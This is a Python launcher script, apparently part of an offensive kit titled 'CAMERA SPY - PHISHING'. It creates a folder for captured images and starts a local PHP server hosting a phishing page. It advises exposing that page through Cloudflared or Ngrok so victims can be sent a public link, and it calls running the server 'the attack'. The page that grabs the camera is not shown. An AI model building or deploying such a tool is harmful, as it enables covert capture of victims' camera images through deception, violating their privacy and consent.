#!/usr/bin/env python3
import os
import time
import sys

# الألوان
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
RESET  = "\033[0m"

def start_cam_spy():
    """الدالة الرئيسية لتشغيل أداة اختراق الكاميرا"""
    os.system("clear")
    print(YELLOW + """
    ╔════════════════════════════════════════╗
    ║          CAMERA SPY - PHISHING         ║
    ║       Created by: Eng-Cybersecurity    ║
    ╚════════════════════════════════════════╝
    """ + RESET)

    # إنشاء مجلد للصور إذا لم يكن موجوداً
    captured_path = os.path.join("cam_spy_file", "captured")
    if not os.path.exists(captured_path):
        os.makedirs(captured_path)

    print(BLUE + "[*] Local Server: http://127.0.0.1:8080" + RESET)
    print(BLUE + "[*] Images Path : cam_spy_file/captured/" + RESET)
    print(GREEN + "\n[!] Starting PHP Server..." + RESET)
    
    # تنبيه المستخدم لاستخدام أداة نفق (Tunneling)
    print(YELLOW + "\n[#] Hint: Use 'Cloudflared' or 'Ngrok' to get a public link." + RESET)
    print(RED + "[!] Press Ctrl+C to stop the attack.\n" + RESET)

    try:
        # تشغيل سيرفر PHP محلي داخل مجلد الأداة
        cmd = f"php -S 127.0.0.1:8080 -t cam_spy_file/"
        os.system(cmd)
    except KeyboardInterrupt:
        print(RED + "\n[!] Server Stopped." + RESET)

if __name__ == "__main__":
    start_cam_spy()
